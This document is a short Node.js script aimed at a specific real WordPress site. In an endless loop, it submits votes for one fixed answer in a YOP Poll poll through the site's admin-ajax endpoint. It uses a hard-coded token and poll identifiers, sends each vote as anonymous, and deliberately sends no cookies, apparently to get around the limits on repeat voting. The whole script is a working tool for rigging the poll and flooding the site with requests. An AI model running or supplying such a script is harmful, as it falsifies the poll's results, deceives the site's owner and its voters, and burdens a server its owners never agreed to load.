import FormData from 'form-data';
import fetch from 'node-fetch';

const executeRequests = async () => {
    const url = 'https://klassikauto.pl/wp-admin/admin-ajax.php';
    let i = 0;
    while(1) {
        const form = new FormData();
        form.append('action', 'yop_poll_record_vote');
        form.append('_token', 'c251cbfa8e');
        form.append('data', JSON.stringify({
            pollId: "85",
            pollUid: "94c3f4e4a00e5e0455fb3c8bb123774b",
            pageId: "37118",
            reCaptcha: "",
            trackingId: "",
            gdprConsent: "",
            data: [
                {
                    id: "85",
                    type: "question",
                    data: [{ id: "2054", data: true }]
                }
            ],
            user: {
                id: "",
                first_name: "",
                last_name: "",
                email: "",
                type: "anonymous",
                f_data: ""
            }
        }));

        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Cookie': '', // Ensures no cookies are sent
                },
                body: form
            });

            const result = await response.text();
            console.log(`Request ${i + 1}:`, result);
            i++;
        } catch (error) {
            console.error(`Error on request ${i + 1}:`, error);
        }
    }
};

executeRequests();
